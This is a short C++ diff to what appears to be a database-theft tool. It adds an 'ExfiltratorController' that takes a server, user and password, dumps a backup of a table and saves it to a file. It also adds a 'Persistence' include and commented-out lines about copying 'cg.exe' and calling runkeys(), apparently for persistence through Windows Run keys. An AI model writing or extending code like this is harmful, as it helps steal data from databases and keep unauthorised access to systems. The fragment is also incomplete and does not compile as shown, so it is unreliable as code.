@@ -1,6 +1,9 @@
 #include <iostream>
+#include <vector>
 #include <mysql.h>
 #include "SQL.h"
+#include "Persistence.h"
+#include "ExfiltratorController.h"
 
 using namespace std;
 
@@ -36,5 +39,12 @@ int main() {
         sql.copyData(database, table);
         column = sql.getFirstColumnName();
         sql.createTrigger(database, table);
+        //std::cout << "Copy the cg.exe file to ";
+        //runkeys();
+        sql.serverURL();
+
+        ExfiltratorController exf = ExfiltratorController(server, user, password);
+        std::vector<std::vector<std::string>> table = exf.createBackup();
+        exf.saveTableToFile(table, "polla.txt");
     }
 }
